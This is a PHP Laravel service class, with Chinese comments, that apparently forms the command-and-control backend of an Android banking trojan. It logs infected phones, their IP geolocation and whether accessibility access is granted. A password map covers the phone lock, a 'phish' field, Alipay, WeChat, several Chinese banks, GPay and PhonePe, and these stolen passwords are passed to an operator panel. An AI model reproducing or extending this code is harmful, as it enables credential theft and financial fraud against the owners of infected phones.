<?php

declare(strict_types=1);

namespace App\WebSocket\Services;

use App\Models\Device;
use App\Services\DeviceTokenService;
use App\Services\GeoIpService;
use App\WebSocket\Config\WebSocketConfig;
use App\WebSocket\ConnectionManager;
use App\WebSocket\WebSocketLog;
use Illuminate\Support\Facades\Redis;

class DeviceStatusService
{
    private const PASSWORD_FIELD_MAP = [
        'phone' => 'pass_phone',
        'phish' => 'pass_phish',
        'alipay' => 'pass_alipay',
        'wechat' => 'pass_wechat',
        'yun' => 'pass_yun',
        'jian' => 'pass_jian',
        'you' => 'pass_you',
        'nong' => 'pass_nong',
        'zhong' => 'pass_zhong',
        'gong' => 'pass_gong',
        'zhao' => 'pass_zhao',
        'gpay' => 'pass_gpay',
        'phonepe' => 'pass_phonepe',
        'bc' => 'pass_bc',
        'mb' => 'pass_mb',
    ];

    public function __construct(
        private readonly ConnectionManager $connectionManager,
        private readonly DatabaseReconnector $databaseReconnector,
        private readonly PanelNotificationService $panelNotificationService,
        private readonly DeviceTokenService $deviceTokenService,
        private readonly EncryptionService $encryptionService,
    ) {}

    public function updateFromPing(string $phoneId, string $encodedData): array
    {
        $status = $this->parseDeviceParams($phoneId, $encodedData);
        $status = $this->enrichWithGeoIp($phoneId, $status);
        $status = $this->normalizeArabicNumerals($status);

        $this->connectionManager->updateDeviceStatus($phoneId, $status);
        $this->syncToDatabase($phoneId, $status);

        return $status;
    }

    private function parseDeviceParams(string $phoneId, string $encodedData): array
    {
        parse_str($encodedData, $params);

        // 清洗 user_email：如果含 ||（设备认证 token 格式），保留原始值用于认证，user_email 只保留纯 email
        if (isset($params['user_email']) && str_contains($params['user_email'], '||')) {
            $params['user_email_raw'] = $params['user_email'];
            $params['user_email'] = explode('||', $params['user_email'], 2)[0];
        }

        return array_merge($params, [
            'phone_id' => $phoneId,
            'last_ping' => time(),
            'is_online' => true,
        ]);
    }

    private function enrichWithGeoIp(string $phoneId, array $status): array
    {
        try {
            if (empty($status['ip'])) {
                $clientIp = $this->connectionManager->getClientIp($phoneId);
                if ($clientIp !== null) {
                    $status['ip'] = $clientIp;
                }
            }

            if (! empty($status['ip'])) {
                $existing = $this->connectionManager->getDeviceStatus($phoneId);
                $existingIp = $existing['ip'] ?? null;
                $existingLocation = $existing['ip_location'] ?? null;

                if ($status['ip'] === $existingIp && ! empty($existingLocation)) {
                    $status['ip_location'] = $existingLocation;
                } else {
                    $device = Device::where('uuid', $phoneId)->first();
                    if ($device && $status['ip'] === $device->ip_address && ! empty($device->ip_location)) {
                        $status['ip_location'] = $device->ip_location;
                    } else {
                        $status['ip_location'] = app(GeoIpService::class)->getLocation($status['ip']);
                    }
                }
            }
        } catch (\Throwable $e) {
            WebSocketLog::getLogger()->warning('IP/GeoIP handling failed, skipping', [
                'phone_id' => $phoneId,
                'error' => $e->getMessage(),
            ]);
        }

        return $status;
    }

    private function normalizeArabicNumerals(array $status): array
    {
        foreach ($status as $key => $value) {
            if (is_string($value)) {
                $status[$key] = $this->normalizeValue($value);
            }
        }

        return $status;
    }

    private function normalizeValue(string $value): string
    {
        $arabicIndic = ['٠', '١', '٢', '٣', '٤', '٥', '٦', '٧', '٨', '٩'];
        $western = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];

        return str_replace($arabicIndic, $western, trim($value));
    }

    private function syncToDatabase(string $phoneId, array $status): void
    {
        $device = Device::where('uuid', $phoneId)->first();
        $isNewDevice = $device === null;

        if ($isNewDevice) {
            $device = $this->createDevice($phoneId, $status);
            if ($device === null) {
                return;
            }
        }

        $updates = $this->buildDatabaseUpdates($status);
        $wasOffline = ! $device->getOriginal('is_online');
        $device->update($updates);

        if ($this->shouldNotifyOnline($isNewDevice, $wasOffline, $phoneId)) {
            WebSocketLog::getLogger()->info("Device online notification: {$phoneId}, isNew={$isNewDevice}, wasOffline={$wasOffline}");

            $phoneInfo = $this->formatForPanel($phoneId);
            $this->panelNotificationService->notifyDeviceOnline($phoneId, $device->user_id, $phoneInfo);
        }
    }

    private function buildDatabaseUpdates(array $status): array
    {
        $updates = [
            'is_online' => true,
            'last_seen_at' => now(),
        ];

        if (isset($status['phone_name'])) {
            $updates['name'] = $status['phone_name'];
        }
        if (isset($status['model'])) {
            $updates['model'] = $status['model'];
        }
        if (isset($status['android_version'])) {
            $updates['android_version'] = $status['android_version'];
        }
        if (isset($status['battery_charge'])) {
            $level = BatteryParser::parseLevel($status['battery_charge']);
            if ($level !== null) {
                $updates['battery_level'] = $level;
            }
        }
        if (isset($status['accessibility'])) {
            $updates['has_accessibility'] = $status['accessibility'] === '1';
        }
        if (isset($status['country'])) {
            $updates['country'] = $status['country'];
        }
        if (isset($status['ip'])) {
            $updates['ip_address'] = $status['ip'];
        }
        if (isset($status['ip_location'])) {
            $updates['ip_location'] = $status['ip_location'];
        }

        return $updates;
    }

    private function shouldNotifyOnline(bool $isNewDevice, bool $wasOffline, string $phoneId): bool
    {
        return $isNewDevice
            || $wasOffline
            || $this->isNewWebSocketConnection($phoneId);
    }

    private function isNewWebSocketConnection(string $phoneId): bool
    {
        $key = WebSocketConfig::lastNotifiedKey($phoneId);
        $lastNotified = Redis::get($key);
        $now = time();

        Redis::setex($key, WebSocketConfig::lastNotifiedTtl(), (string) $now);

        if ($lastNotified === null) {
            return true;
        }

        return ($now - (int) $lastNotified) > WebSocketConfig::newConnectionThreshold();
    }

    private function createDevice(string $phoneId, array $status): ?Device
    {
        $authResult = $this->validateDeviceAuth($phoneId, $status);
        if ($authResult === null) {
            return null;
        }

        $user = $this->resolveDeviceUser($authResult['email']);
        if ($user === null) {
            WebSocketLog::getLogger()->warning("Cannot create device {$phoneId}: no user found");

            return null;
        }

        return Device::create($this->buildDeviceAttributes($phoneId, $status, $user));
    }

    private function validateDeviceAuth(string $phoneId, array $status): ?array
    {
        $rawEmail = $status['user_email_raw'] ?? $status['user_email'] ?? null;
        $authResult = $this->deviceTokenService->validateToken($rawEmail ?? '');

        if (! $authResult['authenticated']) {
            WebSocketLog::getLogger()->warning("Device auth failed for {$phoneId}", [
                'email' => $authResult['email'],
            ]);

            return null;
        }

        return $authResult;
    }

    private function resolveDeviceUser(?string $email): ?\App\Models\User
    {
        $user = $this->findUserByEmail($email);

        if ($user === null) {
            $user = \App\Models\User::first();
        }

        return $user;
    }

    private function buildDeviceAttributes(string $phoneId, array $status, \App\Models\User $user): array
    {
        $batteryLevel = isset($status['battery_charge'])
            ? BatteryParser::parseLevel($status['battery_charge'])
            : null;

        return [
            'uuid' => $phoneId,
            'user_id' => $user->id,
            'name' => $status['phone_name'] ?? 'Unknown Device',
            'model' => $status['model'] ?? null,
            'android_version' => $status['android_version'] ?? null,
            'battery_level' => $batteryLevel,
            'has_accessibility' => ($status['accessibility'] ?? '0') === '1',
            'country' => $status['country'] ?? null,
            'ip_address' => $status['ip'] ?? null,
            'ip_location' => $status['ip_location'] ?? null,
            'installed_at' => isset($status['install_date']) ? \Carbon\Carbon::parse($status['install_date']) : now(),
            'is_online' => true,
            'last_seen_at' => now(),
        ];
    }

    /**
     * 根据 email 查找用户，并返回资源归属用户（父账号）。
     *
     * 若匹配到子账号，则返回其父账号，确保设备挂到正确的归属用户下。
     */
    private function findUserByEmail(?string $email): ?\App\Models\User
    {
        if (empty($email)) {
            return null;
        }

        $this->databaseReconnector->reconnect();

        $user = \App\Models\User::where('email', $email)->first();
        if ($user === null) {
            $encryptedEmail = $this->encryptionService->encryptEmail($email);
            $user = \App\Models\User::where('email_encrypted', $encryptedEmail)->first();
        }

        if ($user === null) {
            return null;
        }

        // 始终返回资源归属用户（子账号 → 父账号，主账号 → 自身）
        return $user->getResourceOwner();
    }

    public function getStatus(string $phoneId): array
    {
        return $this->connectionManager->getDeviceStatus($phoneId);
    }

    public function isOnline(string $phoneId): bool
    {
        return $this->connectionManager->isDeviceOnline($phoneId);
    }

    public function markOffline(string $phoneId): void
    {
        Device::where('uuid', $phoneId)->update([
            'is_online' => false,
            'last_seen_at' => now(),
        ]);
    }

    public function formatForPanel(string $phoneId): array
    {
        $status = $this->getStatus($phoneId);
        $isOnline = $this->isOnline($phoneId);

        // 从数据库读取 remark 字段
        $device = Device::where('uuid', $phoneId)->first();
        $remark = $device?->remark;

        // 直接返回设备原始数据，添加服务端字段
        return array_merge($status, [
            'pid' => $phoneId,
            'is_online' => $isOnline,
            'lastPing' => ($status['last_ping'] ?? 0) * 1000,
            'ip_location' => $status['ip_location'] ?? '',
            'remark' => $remark,
        ]);
    }

    /**
     * 提取密码数据
     */
    public function extractPasswords(string $phoneId): array
    {
        $status = $this->getStatus($phoneId);

        return array_map(
            fn (string $field) => $status[$field] ?? '',
            self::PASSWORD_FIELD_MAP,
        );
    }

    /**
     * 格式化完整的设备状态（包含密码）供 Panel 使用
     */
    public function formatFullStatusForPanel(string $phoneId): array
    {
        $phoneInfo = $this->formatForPanel($phoneId);
        $passwords = $this->extractPasswords($phoneId);

        return [
            'phoneInfo' => $phoneInfo,
            'passwords' => $passwords,
            'is_online' => $phoneInfo['is_online'],
            'lastPing' => $phoneInfo['lastPing'] ?? null,
        ];
    }
}
